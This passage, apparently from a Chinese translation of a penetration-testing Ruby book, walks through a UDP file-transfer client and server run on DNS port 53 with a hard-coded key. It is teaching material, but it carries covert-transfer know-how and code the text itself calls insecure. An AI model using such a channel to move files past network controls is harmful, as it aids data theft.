  \n**注意**\n\n如果客户端和服务器之间的通信出现问题，两个组件可能会在等待可能永远不会到达的输出时挂起。如果失败，我们可以重新启动两者并重试。如果要在实际环境中使用，额外的错误处理将帮助我们克服这些挑战。\n\
  \n我们将计数器初始化为 `1`，用于 `while` 循环。当 `contents` 数组中仍有数据时，我们创建一条新消息。我们将会话和数据包计数器值添加到消息中，并用空字符分隔。最后，我们添加下一段文件内容以及另一个空终止符。我们进行一些计算，确保数据包限制在\
  \ 1024 个字符以内，以便数据包能够通过。我们逐个发送每个数据块，直到完成。现在，我们有了使用 DFTP 模块发送文件的方法。接下来，我们来了解如何接收文件。\n\
  \n```\nclass DFTPServer < DFTPBase\n\n   def initialize(host,port,key)\n     super(host,port,key)\n\
  \     @sock.bind(@host, @port)\n     @sessions = {}\n   end\n```\n\n我们创建 `DFTPServer`\
  \ 类，但需要比客户端类更多的设置。我们使用 `super` 方法创建一个新的 `initialize` 类，以调用 `DFTPBase` 类的初始化方法。接着，我们使用实例的\
  \ `sock` 变量的 `bind` 方法创建监听器。我们还为会话创建了一个存储哈希表。这将帮助我们支持多个同时进行的文件传输。只有当每个会话收到最后一个数据包时，我们才会写出该会话的文件。\n\
  \n```\ndef run\n   loop {\n     rkey,rfile,type,data,pkt,ses,last = nil\n     text,\
  \ sender = @sock.recvfrom(1024)\n```\n\n下一步是创建一个方法，使服务器开始处理传入连接。我们希望服务器一直运行，直到我们发出中断控制序列（`Ctrl\
  \ + c`）。我们创建一个循环并初始化变量。`Rkey` 将是客户端传递给服务器的键，`rfile` 将存储远程文件名。`type` 将是客户端希望执行的命令类型。在本例中，我们只处理写入操作。`Data`、`pkt`\
  \ 和 `ses` 在客户端代码中也使用过，`last` 将用于指示何时收到会话中的最后一个数据包。我们从客户端接收代码，并将数据存储在 `text` 变量中，将发送方信息存储在\
  \ `sender` 变量中。现在我们已经收到消息，需要弄清楚如何处理它。\n\n```\n  if text.start_with? @@Read or text.start_with?\
  \ @@Write\n    type = text[0]\n    rkey,rfile = text[1..-1].split(\"\\000\")[0,2]\n\
  \  else\n    ses = text[0..text.index(\"\\000\")-1]\n    pkt = text[ses.size+1..text.index(\"\
  \\000\",ses.size+1)-1]\n    data = text[(ses.size + pkt.size + 2)..-2]\n    ses\
  \ = ses.to_i\n    pkt = pkt.to_i\n    last = 1 if text.size < 1022\n  end\n```\n\
  \n如果数据包内容以读取或写入字符开头，我们就知道这是一个读取或写入请求。我们将 `type` 变量设置为该第一个字符，并根据预期的空字符分隔值设置 `rkey`\
  \ 和文件名变量。如果第一个字符是其他内容（会话始终应该是这种情况），我们尝试将其解析为数据包。我们将会话作为从第一个字符到第一个空字符的内容。从第一个空字符到第二个空字符的数据是我们的数据包编号。数据包的其余部分是文件数据。我们将\
  \ `ses` 和 `pkt` 转换回整数，并检查收到的信息是否少于 1024 个字符。如果是，那应该是我们的最后一个数据包，因为我们一直确保每次发送 UDP\
  \ 数据包时都发送 1024 个字符。\n\n```\n    if type and rkey == @key\n      if type == @@Write[0]\n\
  \        ses = Time.now.to_i\n        @sessions[ses] = {:file => rfile, :data =>\
  \ []}\n        @sock.send(\"\\001#{ses}\\000\",0,sender.last,sender[1])\n      end\n\
  \      elsif ses and @sessions.has_key? ses.to_i\n        @sessions[ses][:data][pkt.to_i]\
  \ = data\n        if last == 1\n          f = File.new(@sessions[ses][:file],\"\
  w\")\n          f.puts(@sessions[ses][:data].to_s)\n          f.close\n        \
  \  @sessions.delete(ses)\n        end\n     end\n    }\n   end\n end\nend\n```\n\
  \n现在，我们拥有了处理数据包所需的所有核心信息。因此，我们判断 `type` 变量是否已设置。如果已设置，并且等于写入，则初始化一个新会话。我们的会话 ID\
  \ 是当前时间的整数格式。这并非特别安全，但对于我们正在做的事情来说已经足够安全。我们使用会话 ID 创建一个新会话，并创建一个新的哈希表来保存文件名和数据。数据将存储在一个数组中。这样，我们可以将每个数据包存储在其编号对应的字段中。这使我们能够接收乱序的数据包，并仍然将它们重新组合起来。会话初始化后，我们将会话信息返回给客户端，以便客户端知道可以开始发送数据。\n\
  \n如果未设置 `type`，则表示我们正在接收会话的后续部分。如果会话已设置，并且会话存在于会话哈希表中，则继续处理数据包。如果会话存在，我们将数据添加到会话的数据数组中。如果这是最后一个数据包，则写出文件。我们使用客户端传递的文件名打开一个新的文件句柄，并将数组中的数据写入文件。我们将数组转换为字符串以便重新组装，从而方便存储。将信息写入文件后，我们关闭文件并删除会话。现在，我们已成功传输了一个文件。模块已完成。现在，我们只需编写使用我们创建的新\
  \ DFTP 模块的脚本。我们将文件保存为 `DFTP.rb`，以便 Ruby 在包含该文件时知道如何加载它。\n\n现在，我们创建客户端代码。由于我们已经将大部分重要代码包含在模块中，因此客户端代码很简单。我们需要打开要发送的文件，创建一个新的\
  \ DFTP 客户端类实例，然后发送数据。\n\n```\n#!/usr/bin/ruby\n\nrequire ’DFTP’\n\nfile = File.open(ARGV[0],\"\
  r\").read()\nc = DFTP::DFTPClient.new(’localhost’,53,’abc123’)\nc.send_file(ARGV[1],file)\n\
  ```\n\n我们的代码包含 DFTP 模块的方式与包含任何内置模块相同：使用 `require` 关键字。为了读取数据，我们使用熟悉的 `File` 类以读取模式打开传递给脚本的第一个参数，并将数据存储在\
  \ `file` 变量中。我们创建一个 `DFTPClient` 实例，连接到 `localhost` 的 `53` 端口（DNS 端口）。我们将键设置为 `abc123`。\n\
  \n**警告**\n\n\n\n\n这段代码并非特别安全。不仅因为本例中我们的密钥过于简单，而且几乎没有添加任何安全考虑来确保使用此代码的操作的稳定性或机密性。因此，在任何需要实际安全性的地方，强烈不建议直接使用此代码。\n\
  \n最后，我们使用文件名（来自第二个参数）和从文件中读取的数据发送文件。就是这么简单。现在让我们看看我们的服务器类。\n\n```ruby\n#!/usr/bin/ruby\n\
  \nrequire ’DFTP’\n\nc = DFTP::DFTPServer.new(’localhost’,53,’abc123’)\n\nc.run\n\
  ```\n\n我们的 DFTP 服务器代码甚至更简单。我们包含模块并使用相同的信息创建一个新的`DFTPServer`实例。我们使用`run`方法开始监听，脚本将持续运行直到我们终止它。为了测试，我们通过调用`./DFTP_server.rb\
  \ &`在后台运行服务器。我们创建一个包含一些基本信息的文本文件，然后运行`./DFTP_client.rb <filename> <new_filename>`。一旦客户端脚本退出，我们应该能在目录中看到新文件。查看图\
  \ 4.10 查看输出。\n\n![image](img/F000047f04-10-9781597497299.jpg)\n\n图 4.10 我们的 DFTP\
  \ 会话输出\n\n## 总结\n\n在本章中，我们通过示例实践了类、模块以及高级字符串和对象操作的概念。这些练习将帮助我们在遇到数据类型转换重要的场景时更好地应对。无论是处理二进制协议、解析特定类型的文件，还是使用数据库，Ruby\
  \ 都有许多功能可以帮助我们更好地完成工作。\n\n完成了这些基本任务后，我们将更好地准备在第 9 章中学习 Metasploit 编程，以及在第 10 章中研究利用和后利用任务。\n\
